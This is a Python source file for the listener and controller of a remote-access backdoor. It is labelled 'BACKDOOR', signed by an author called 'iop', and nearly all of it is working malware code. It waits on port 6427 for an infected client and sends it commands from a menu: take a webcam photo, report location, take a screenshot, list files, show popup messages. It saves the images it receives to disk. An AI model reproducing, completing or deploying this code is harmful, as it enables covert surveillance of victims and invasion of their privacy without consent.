from socket import *
import socket
import os

GREEN = "\033[92m"
RESET = "\033[0m"

banner = r"""
 _______    ______    ______   __    __  _______    ______    ______   _______          ______   __    __   ______    ______    ______   ________ 
|       \  /      \  /      \ |  \  /  \|       \  /      \  /      \ |       \        /      \ |  \  |  \ /      \  /      \  /      \ |        \
| $$$$$$$\|  $$$$$$\|  $$$$$$\| $$ /  $$| $$$$$$$\|  $$$$$$\|  $$$$$$\| $$$$$$$\      |  $$$$$$\| $$  | $$|  $$$$$$\|  $$$$$$\|  $$$$$$\| $$$$$$$$
| $$__/ $$| $$__| $$| $$   \$$| $$/  $$ | $$  | $$| $$  | $$| $$  | $$| $$__| $$      | $$   \$$| $$__| $$| $$  | $$| $$  | $$| $$___\$$| $$__    
| $$    $$| $$    $$| $$      | $$  $$  | $$  | $$| $$  | $$| $$  | $$| $$    $$      | $$      | $$    $$| $$  | $$| $$  | $$ \$$    \ | $$  \   
| $$$$$$$\| $$$$$$$$| $$   __ | $$$$$\  | $$  | $$| $$  | $$| $$  | $$| $$$$$$$\      | $$   __ | $$$$$$$$| $$  | $$| $$  | $$ _\$$$$$$\| $$$$$   
| $$__/ $$| $$  | $$| $$__/  \| $$ \$$\ | $$__/ $$| $$__/ $$| $$__/ $$| $$  | $$      | $$__/  \| $$  | $$| $$__/ $$| $$__/ $$|  \__| $$| $$_____ 
| $$    $$| $$  | $$ \$$    $$| $$  \$$\| $$    $$ \$$    $$ \$$    $$| $$  | $$       \$$    $$| $$  | $$ \$$    $$ \$$    $$ \$$    $$| $$     \
 \$$$$$$$  \$$   \$$  \$$$$$$  \$$   \$$ \$$$$$$$   \$$$$$$   \$$$$$$  \$$   \$$        \$$$$$$  \$$   \$$  \$$$$$$   \$$$$$$   \$$$$$$  \$$$$$$$$


"""


def main():
    s = socket.socket()
    s.bind(('0.0.0.0', 6427))
    s.listen()
    s, addr = s.accept()

    print(GREEN + banner + RESET)
    print(GREEN + f"Client connected: {addr}" + RESET)
    print(GREEN + "MAKE-BY-IOP" + RESET)
    print(GREEN + "-" * 67 + RESET)
    print(GREEN + "Author: iop" + RESET)
    print(GREEN + "BACKDOOR" + RESET)
    print(GREEN + "-" * 67 + RESET)

    while True:
        print("\nMenu:")
        print("1. Exit")
        print("2. Restart client")
        print("3. Take webcam photo")
        print("4. Get location")
        print("5. Screenshot")
        print("6. List files in current directory")
        print("7. Show popup message")
        choice = input("Enter operation number: ").strip()
        s.send(choice.encode())

        if choice == '1':
            print("Exiting...")
            break

        elif choice in ['3', '5']:  # Receive image
            file_size = int(s.recv(1024).decode())
            s.send(b'ok')

            filename = '1.png' if choice == '3' else '2.png'

            cur_size = 0
            with open(filename, 'wb') as f:
                while cur_size < file_size:
                    data = s.recv(1024)
                    f.write(data)
                    cur_size += len(data)
            print(f"Saved: {filename}")

        elif choice == '4':  # Location
            loc = s.recv(1024).decode()
            print("Location:")
            print(loc)

        elif choice == '6':  # File list
            data = s.recv(4096).decode()
            print("File list:")
            print(data)

        elif choice == '7':  # Popup message
            text = input(GREEN + "Enter message to display: " + RESET)
            s.send(text.encode())


if __name__ == '__main__':
    main()
